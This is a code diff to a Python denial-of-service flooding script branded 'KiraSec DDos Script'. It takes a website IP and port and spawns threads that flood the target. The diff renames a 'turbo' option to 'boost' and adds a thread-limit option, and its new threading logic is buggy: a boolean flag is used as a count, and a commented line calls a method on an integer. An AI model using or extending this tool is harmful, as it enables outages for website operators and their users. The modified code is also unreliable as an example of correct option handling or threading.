@@ -3,15 +3,15 @@
 
 # python 3.3.2+ KiraSec DDos Script V0.1
 # by AnonZenn ~ KiraSec
-# only for KiraSec 
+# contributor: @V01DKiraSec
+# only for KiraSec and friends
+
+#TODO: Maybe we could use a text file or something for bots and agents, so it is easier to extend
 
 from colorama import Fore, Back, Style
 from queue import Queue
 from optparse import OptionParser
 import time,sys,socket,threading,logging,urllib.request,random
-
-
-
 
 
 def user_agent():
@@ -926,7 +926,8 @@ def usage():
 	usage : python3 KiraSecddos.py  [-s] [-p] [-t]
 	-s : Website IP (You can check using https://check-host.net )
 	-p : port (use ports 80 and 443)
-	-t : turbo (recommended 135 or 443 for a quicker flood)  \033[92m
+	-t: specify the max threads treshhold, defaults to 10 threads
+	-b : boost (recommended 135 or 443 for a quicker flood)  \033[92m
 	==========================================================================================================================''')
 	sys.exit()
 
@@ -936,11 +937,13 @@ def get_parameters():
 	global port
 	global thr
 	global item
+	global tth
 	optp = OptionParser(add_help_option=False,epilog="Hammers")
 	optp.add_option("-q","--quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
 	optp.add_option("-s","--server", dest="host",help="attack to server ip -s ip")
 	optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")
-	optp.add_option("-t","--turbo",type="int",dest="turbo",help="default 135 -t 135")
+	optp.add_option("-t","--threads",dest="threads",action='store_true',help="Max amount of threads")
+	optp.add_option("-b","--boost",type="int",dest="boost",help="default 135 -t 135")
 	optp.add_option("-h","--help",dest="help",action='store_true',help="help you")
 	opts, args = optp.parse_args()
 	logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')
@@ -954,10 +957,14 @@ def get_parameters():
 		port = 80
 	else:
 		port = opts.port
-	if opts.turbo is None:
+	if opts.boost is None:
 		thr = 135
 	else:
-		thr = opts.turbo
+		thr = opts.boost
+	if opts.threads is None:
+		tth =  10
+	else:
+		tth = opts.threads
 
 
 # reading headers
@@ -974,7 +981,7 @@ if __name__ == '__main__':
 	if len(sys.argv) < 2:
 		usage()
 	get_parameters()
-	print("\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
+	print("\033[92m",host," port: ",str(port)," boost: ",str(thr),"\033[0m")
 	print("\033[94mPlease wait...\033[0m")
 	user_agent()
 	my_bots()
@@ -986,14 +993,21 @@ if __name__ == '__main__':
 	except socket.error as e:
 		print("\033[91mcheck server ip and port\033[0m")
 		usage()
+
+
+
 	while True:
 		for i in range(int(thr)):
-			t = threading.Thread(target=dos)
-			t.daemon = True  # if thread is exist, it dies
-			t.start()
-			t2 = threading.Thread(target=dos2)
-			t2.daemon = True  # if thread is exist, it dies
-			t2.start()
+			while tth >= 0:
+				t = threading.Thread(target=dos)
+				# tth.daemon = True  # if thread is exist, it dies
+				t.start()
+				t2 = threading.Thread(target=dos2)
+				# t2.daemon = True  # if thread is exist, it dies
+				t2.start()
+				print(tth)
+				tth -= 1
+
 		start = time.time()
 		#tasking
 		item = 0
